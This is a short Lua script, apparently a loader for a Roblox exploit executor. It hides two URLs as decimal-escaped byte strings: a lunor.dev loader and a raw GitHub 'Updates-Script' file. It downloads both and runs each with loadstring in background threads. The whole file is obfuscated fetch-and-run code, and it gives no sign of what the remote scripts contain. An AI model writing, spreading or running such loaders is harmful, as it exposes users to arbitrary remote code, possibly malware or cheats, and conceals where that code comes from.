do
    local spawnFunc = (task and task.spawn) or spawn or coroutine.wrap
    local httpGet = function(url)
        local ok, res = pcall(function() return game:HttpGet(url) end)
        if ok and type(res) == "string" then return res end
        if syn and syn.request then
            local r = syn.request({Url = url, Method = "GET"})
            if r and r.Body then return r.Body end
        end
        if http and http.request then
            local r = http.request({Url = url, Method = "GET"})
            if r and r.Body then return r.Body end
        end
        error("No HTTP method available.")
    end
    local loader = loadstring or load

    local u1 = table.concat({
        "\104\116\116\112\115\58\47\47",
        "\108\117\110\111\114\46\100\101\118",
        "\47\108\111\97\100\101\114"
    })

    local u2 = table.concat({
        "\104\116\116\112\115\58\47\47",
        "\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109",
        "\47\85\112\100\97\116\101\115\45\83\99\114\105\112\116\47\85\112\100\97\116\101\100",
        "\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\83\99\114\105\112\116\46\108\117\97"
    })

    spawnFunc(function()
        loader(httpGet(u1))()
    end)
    spawnFunc(function()
        loader(httpGet(u2))()
    end)
end
